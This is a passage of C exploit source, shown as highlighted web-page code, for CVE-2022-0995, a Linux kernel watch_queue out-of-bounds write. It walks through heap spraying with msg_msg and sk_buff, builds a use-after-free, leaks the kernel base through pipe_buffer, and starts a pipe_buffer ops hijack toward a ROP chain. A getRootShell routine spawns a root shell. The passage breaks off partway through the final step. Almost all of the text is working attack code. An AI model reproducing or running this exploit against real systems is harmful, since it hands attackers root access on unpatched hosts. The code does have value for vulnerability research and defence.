class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigerOutOfBoundWrite</span><span class="params">(<span class="type">int</span> pipe_fd[<span class="number">2</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nfilters;</span><br><span class="line">    </span><br><span class="line">    nfilters = <span class="number">4</span>;</span><br><span class="line">    wfilter = (<span class="keyword">struct</span> watch_notification_filter*)</span><br><span class="line">            <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> watch_notification_filter)</span><br><span class="line">                + nfilters * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> watch_notification_type_filter));</span><br><span class="line">    wfilter-&gt;nr_filters = nfilters;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// normal filter</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (nfilters - <span class="number">1</span>); i++)</span><br><span class="line">        wfilter-&gt;filters[i].type = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// evil filter</span></span><br><span class="line">    <span class="comment">// 0x300 = 64 * 12, 12 * 8 = 96bytes</span></span><br><span class="line">    <span class="comment">// 1 &lt;&lt; 0xa = 1024, maybe we can hit a proper bit</span></span><br><span class="line">    wfilter-&gt;filters[nfilters - <span class="number">1</span>].type = <span class="number">0x30a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger oob write</span></span><br><span class="line">    <span class="keyword">if</span> (ioctl(pipe_fd[<span class="number">0</span>], IOC_WATCH_QUEUE_SET_FILTER, wfilter) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prevent memory leak in userspace(no need in fact)</span></span><br><span class="line">    <span class="built_in">free</span>(wfilter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] CVE-2022-0995 Linux Privilege Escalation.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pipe to trigert off-by-null</span></span><br><span class="line">    <span class="keyword">if</span> (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create O_NOTIFICATION_PIPE!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create hole in primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger off-by-null on primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);</span><br><span class="line">    trigerOutOfBoundWrite(oob_pipe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the queues that have the same secondary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);</span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">1024</span>) == <span class="number">0</span>)  <span class="comment">// the hole</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error qid: %d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, </span><br><span class="line">            victim_qid, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span 